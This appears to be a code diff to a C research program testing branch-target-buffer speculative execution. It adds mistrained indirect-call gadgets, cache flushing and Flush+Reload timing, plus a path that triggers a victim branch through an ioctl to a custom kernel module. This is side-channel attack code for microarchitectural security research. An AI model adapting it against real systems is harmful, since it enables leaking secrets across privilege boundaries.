@@ -6,9 +6,28 @@
 #include <fcntl.h>
 #include <string.h>
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
-
+#include <syscall.h>
+#include "ap_ioctl.h"
+#include "bp_tools.h"
 #define CACHE_THRESHHOLD 80
+
 // gcc -g -O0  -fno-pie -no-pie -o btb_speculation_test btb_speculation_test.c 
+
+/*
+    "a"(value) → %rax 레지스터에 넣음 (또는 rax으로 지정)
+
+    "D"(value) → %rdi
+
+    "S"(value) → %rsi
+
+    "d"(value) → %rdx
+
+    "b"(value) → %rbx
+
+    "c"(value) → %rcx
+
+    "r"(value) → 임의의 일반 목적 레지스터 (컴파일러가 선택)
+*/
 
 #define my_snip(name,code)                      \
     asm(".pushsection .text\n"                  \
@@ -21,19 +40,37 @@
         ".popsection\n");
 
 my_snip(br_src_call,
+    // BHB setup
     "nop\n"
     "lfence\n"
-    "leaq 1536(%rdi), %rbx\n" // rbx = &probe[3*256]
-    "call *%rsi\n"
+    "addq $1536, %rcx\n" // rcx = &probe[3*256]
+    // increase speculation window
+    "clflush (%rbx)\n"
+    // mistrained call
+    "call *%rbx\n"
     "ret\n"
     )
 
 my_snip(sig_gadget,
-    "movzbl (%rbx), %eax\n"  // movzbl (suffix l = 32 bit)을 사용하였기 때문에 eax로 load 해야 함.
+    //"movzbl (%rbx), %eax\n"  // movzbl (suffix l = 32 bit)을 사용하였기 때문에 eax로 load 해야 함.
+    "mov (%rcx), %rcx\n" //load probe[secret]
+    "syscall\n"   //syscall for context switch
+    "ret\n"
+    )
+
+my_snip(test_gadget,
+    "lfence\n"
+    "movzbl (%rbx), %eax\n"
+    "ret\n"
+    )
+
+my_snip(victim_dst,
     "ret\n")
+
 
 unsigned long br_src_addr;
 unsigned long sig_gadget_addr;
+unsigned long victim_dst_addr;
 
 extern unsigned char br_src_call_start[];
 extern unsigned char br_src_call_end[];
@@ -41,14 +78,15 @@ extern unsigned char br_src_call_end[];
 extern unsigned char sig_gadget_start[];
 extern unsigned char sig_gadget_end[];
 
+extern unsigned char victim_dst_start[];
+extern unsigned char victim_dst_end[];
+
 int result[256];
 
-
 unsigned long map_code(unsigned long addr, void* code_addr, size_t code_size){
+    unsigned long base = addr & ~0xfff;
     size_t page_sz = (size_t)getpagesize();
     size_t offset = addr & 0xfff;
-    unsigned long base = addr & ~0xfff;
-
     size_t map_len = (offset + code_size + page_sz - 1) & ~(page_sz - 1);
 
     void* page = mmap((void*)base, map_len,
@@ -70,17 +108,32 @@ void flush_array(uint8_t* probe){
         _mm_clflush(&probe[i *512]);
 }
 
-void call_gadget(uint8_t *probe){
+struct ap_payload p;
+
+void set_brc_src_call_by_victim(void *args){
     asm volatile(
-        "call *%%rax\n"
+        "call *%%rdx\n"
         :
-        : "a"(br_src_addr) , "S" (sig_gadget_addr), "D" (probe)
+        : "d"(br_src_addr),"b"(victim_dst_addr), "c"(args)
+    );
+}
+
+void call_gadget(uint8_t *probe){
+    p.fptr = set_brc_src_call_by_victim;
+    p.data = probe;
+    asm volatile(
+        "call *%0\n"
+        :
+        : "a"(SYS_ioctl) , "D" (fd_ap), "d" (AP_IOCTL_RUN),"S"(&p), //syscall (ioctl에 들어갈 인자)
+        "r"(br_src_addr), "b"(sig_gadget_addr),"c"(probe)
+
     );
 }
 
 int find_cached_index(int* arr){
     int max_score = 0;
     int index = -1;
+
     for(int i = 0; i <256; i++){
         if(arr[i] > max_score){
             max_score = arr[i];
@@ -91,7 +144,6 @@ int find_cached_index(int* arr){
 }
 
 uint64_t check_latency(uint8_t* probe,int index){
-    
     unsigned int junk;
     volatile uint8_t *addr;
     register uint64_t t1, t2;
@@ -106,9 +158,6 @@ uint64_t check_latency(uint8_t* probe,int index){
 }
 
 void reload(uint8_t* probe){
-    
-    
-
     for(int i = 0; i <256; i++){
         int mix_i;
         mix_i = ((i * 167) + 13) & 255;
@@ -116,12 +165,9 @@ void reload(uint8_t* probe){
         if(check_latency(probe,mix_i) < CACHE_THRESHHOLD)
             result[mix_i]++;
     }
-
-    
 }
 
 void run(uint8_t* probe){
-    probe[0] = 5;
     for(int tries = 0; tries < 5000; tries++){
         flush_array(probe);
 
@@ -135,10 +181,13 @@ void run(uint8_t* probe){
 int main(void){
     size_t br_src_code_tmpl_size = (size_t)(br_src_call_end - br_src_call_start);
     size_t sig_gadget_tmpl_size = (size_t)(sig_gadget_end - sig_gadget_start);
+    size_t victim_dst_tmpl_size = (size_t)(victim_dst_end - victim_dst_start);
 
     uint8_t probe[256 *512];
 
     srandom(getpid());
+
+    ap_init();
 
     do{
         br_src_addr = ((unsigned long)random() << 16) ^ random();
@@ -149,6 +198,11 @@ int main(void){
         sig_gadget_addr = ((unsigned long)random() << 16) ^ random();
         sig_gadget_addr = map_code(sig_gadget_addr, sig_gadget_start, sig_gadget_tmpl_size);
     } while (sig_gadget_addr == (unsigned long)-1);
+
+    do{
+        victim_dst_addr = ((unsigned long)random() << 16) ^ random();
+        victim_dst_addr = map_code(victim_dst_addr,victim_dst_start, victim_dst_tmpl_size);
+    } while(victim_dst_addr == (unsigned) - 1);
 
     run(probe);
 
